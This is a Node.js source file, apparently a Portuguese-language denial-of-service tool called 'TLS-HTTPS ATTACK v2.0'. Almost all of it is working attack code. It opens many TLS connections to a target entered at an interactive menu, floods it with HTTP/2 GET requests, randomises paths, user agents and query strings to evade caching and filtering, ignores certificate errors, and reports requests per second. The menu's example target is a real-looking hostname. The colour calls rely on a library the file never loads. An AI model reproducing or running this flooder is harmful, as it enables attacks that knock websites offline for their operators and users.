const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const readline = require('readline');

// ==============================================
// CONFIGURAÇÕES
// ==============================================
const ATTACK_CONFIG = {
    MAX_RETRIES: 2,
    CONNECTION_TIMEOUT: 15000,
    INITIAL_WINDOW_SIZE: 6291456,
    MAX_CONCURRENT_STREAMS: 500,
    BATCH_SIZE: 20,
    RATE_INTERVAL: 200,
    SESSION_DURATION: 10000,
    ALPN_PROTOCOLS: ['h2', 'http/1.1'],
    CIPHERS: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA'
};

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ==============================================
// FUNÇÕES AUXILIARES
// ==============================================
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

function randomPath() {
    const paths = ['/', '/api', '/v1', '/static', '/assets', '/images', '/css', '/js'];
    return randomElement(paths) + '?' + crypto.randomBytes(8).toString('hex');
}

function randomHeaders(host) {
    return {
        ":method": "GET",
        ":path": randomPath(),
        ":scheme": "https",
        ":authority": host,
        "user-agent": randomElement(USER_AGENTS),
        "accept": "*/*",
        "accept-language": "pt-BR,pt;q=0.9,en;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "sec-ch-ua": '"Chromium";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "upgrade-insecure-requests": "1"
    };
}

// ==============================================
// FUNÇÃO DE ATAQUE DIRETO (SEM PROXY)
// ==============================================
function directAttack(target, rate, duration) {
    const parsedTarget = url.parse(target);
    const host = parsedTarget.hostname;
    const endTime = Date.now() + (duration * 1000);
    let totalSent = 0;
    let activeConnections = 0;
    const maxConnections = 50;
    
    console.log(`\n[+] Iniciando ataque DIRETO em ${host}`.green);
    console.log(`[+] Duração: ${duration}s | Rate: ${rate}/s`.cyan);
    console.log('[+] Pressione CTRL+C para parar\n'.yellow);
    
    function createConnection() {
        if (Date.now() >= endTime) return;
        if (activeConnections >= maxConnections) {
            setTimeout(createConnection, 100);
            return;
        }
        
        activeConnections++;
        
        try {
            const socket = net.createConnection({ host: host, port: 443, timeout: 10000 });
            
            socket.once("connect", () => {
                const tlsConn = tls.connect({
                    socket: socket,
                    servername: host,
                    ALPNProtocols: ATTACK_CONFIG.ALPN_PROTOCOLS,
                    rejectUnauthorized: false,
                    ciphers: ATTACK_CONFIG.CIPHERS,
                    minVersion: "TLSv1.2",
                    maxVersion: "TLSv1.3"
                }, () => {
                    const client = http2.connect(`https://${host}`, {
                        createConnection: () => tlsConn,
                        settings: {
                            maxConcurrentStreams: ATTACK_CONFIG.MAX_CONCURRENT_STREAMS,
                            initialWindowSize: ATTACK_CONFIG.INITIAL_WINDOW_SIZE,
                            enablePush: false
                        }
                    });
                    
                    client.on("connect", () => {
                        const headers = randomHeaders(host);
                        let requestCount = 0;
                        
                        const sendRequests = () => {
                            if (Date.now() >= endTime || client.destroyed) {
                                clearInterval(interval);
                                return;
                            }
                            
                            for (let i = 0; i < rate; i++) {
                                if (client.destroyed) break;
                                const req = client.request(headers);
                                req.on("response", () => {
                                    totalSent++;
                                    req.close();
                                    req.destroy();
                                });
                                req.on("error", () => {
                                    req.close();
                                    req.destroy();
                                });
                                req.end();
                            }
                        };
                        
                        const interval = setInterval(sendRequests, 1000);
                        
                        setTimeout(() => {
                            clearInterval(interval);
                            client.destroy();
                            socket.destroy();
                            activeConnections--;
                            setTimeout(createConnection, 100);
                        }, 5000);
                    });
                    
                    client.on("error", () => {
                        socket.destroy();
                        activeConnections--;
                        setTimeout(createConnection, 500);
                    });
                });
                
                tlsConn.on("error", () => {
                    socket.destroy();
                    activeConnections--;
                    setTimeout(createConnection, 500);
                });
            });
            
            socket.on("error", () => {
                socket.destroy();
                activeConnections--;
                setTimeout(createConnection, 500);
            });
            
            socket.on("timeout", () => {
                socket.destroy();
                activeConnections--;
                setTimeout(createConnection, 500);
            });
            
        } catch(e) {
            activeConnections--;
            setTimeout(createConnection, 500);
        }
    }
    
    // Inicia conexões iniciais
    for (let i = 0; i < 10; i++) {
        setTimeout(createConnection, i * 100);
    }
    
    // Monitor de progresso
    const progressInterval = setInterval(() => {
        const elapsed = (Date.now() - (endTime - duration * 1000)) / 1000;
        const rps = elapsed > 0 ? Math.round(totalSent / elapsed) : 0;
        console.log(`[${new Date().toLocaleTimeString()}] SENT: ${totalSent.toLocaleString()} | RPS: ${rps} | CONNECTIONS: ${activeConnections}`.cyan);
        
        if (Date.now() >= endTime) {
            clearInterval(progressInterval);
            console.log(`\n[+] Ataque finalizado! Total enviado: ${totalSent.toLocaleString()}`.green);
            process.exit(0);
        }
    }, 2000);
}

// ==============================================
// MENU INTERATIVO
// ==============================================
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function showMenu() {
    console.clear();
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                    TLS-HTTPS ATTACK v2.0                      ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  [1] Ataque DIRETO (sem proxy) - Recomendado para teste     ║
║  [2] Ataque com PROXY (requer proxy.txt)                    ║
║  [3] Sair                                                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `.cyan);
    
    rl.question('Escolha uma opção: ', (choice) => {
        if (choice === '1') {
            rl.question('URL do alvo (ex: https://server.bronxyshost.com): ', (target) => {
                if (!target || !target.startsWith('http')) {
                    console.log('[!] URL inválida! Use https://site.com'.red);
                    setTimeout(showMenu, 2000);
                    return;
                }
                rl.question('Tempo (segundos, padrão 60): ', (time) => {
                    const duration = parseInt(time) || 60;
                    rl.question('Rate (requests/segundo, padrão 30): ', (rate) => {
                        const rateVal = parseInt(rate) || 30;
                        rl.close();
                        directAttack(target, rateVal, duration);
                    });
                });
            });
        } else if (choice === '2') {
            console.log('\n[!] Função com proxy em desenvolvimento...'.yellow);
            console.log('[!] Use o modo DIRETO (opção 1) para testar'.yellow);
            setTimeout(showMenu, 2000);
        } else if (choice === '3') {
            console.log('Saindo...'.yellow);
            rl.close();
            process.exit(0);
        } else {
            console.log('[!] Opção inválida!'.red);
            setTimeout(showMenu, 1000);
        }
    });
}

// ==============================================
// INÍCIO
// ==============================================
showMenu();
